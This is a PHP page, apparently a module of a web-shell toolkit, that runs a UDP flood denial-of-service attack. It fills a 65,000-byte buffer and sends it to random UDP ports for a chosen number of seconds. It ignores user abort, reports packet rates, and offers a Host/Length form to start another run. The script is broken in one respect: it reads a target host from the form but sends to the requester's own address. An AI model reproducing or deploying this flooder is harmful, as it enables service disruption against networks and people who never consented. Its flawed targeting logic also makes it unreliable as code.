<html>
<BODY OnKeyPress="GetKeyCode();" text=#000CC bottomMargin=0 bgColor=black leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><center><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#66 cellPadding=5 width="100%" bgcolor=black borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr><th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2"><center><font color="#0033FF"><pre>
<tr><td>
<center>
<?php
//UDP
if(isset($_GET['host'])&&is_numeric($_GET['time'])){
$pakits = 0;
ignore_user_abort(TRUE);

$exec_time = $_GET['time'];

$time = time();
//print "Started: ".time('h:i:s')."<br>";
$max_time = $time+$exec_time;

$host = $_SERVER['REMOTE_ADDR'];

for($i=0;$i<65000;$i++){
$out .= 'X';
}
while(1){
$pakits++;
if(time() > $max_time){
break;
}
$rand = rand(1,65000);
$fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);
if($fp){
fwrite($fp, $out);
fclose($fp);
}
}
echo "<br><b>UDP Flood</b><br>Completed with $pakits (" . round(($pakits*65)/1024, 2) . " MB) packets averaging ". round($pakits/$exec_time, 2) . " packets per second \n";
echo '<br><br>
<form action="'.$surl.'" method=GET>
<input type="hidden" name="act" value="phptools">
Host: <input type=text name=host value=IP>
Length (seconds): <input type=text name=time value=15>
<input type=submit value=Go></form>';
}else{ echo '<br><b>UDP Flood</b><br>
<form action=? method=GET>
<input type="hidden" name="act" value="phptools">
Host: <br><input type=text name=host ><br>
Length (seconds): <br><input type=text name=time value=10><br>
<input type=submit value=Go></form>';
}
?>
</tr></td>
</body>
</html>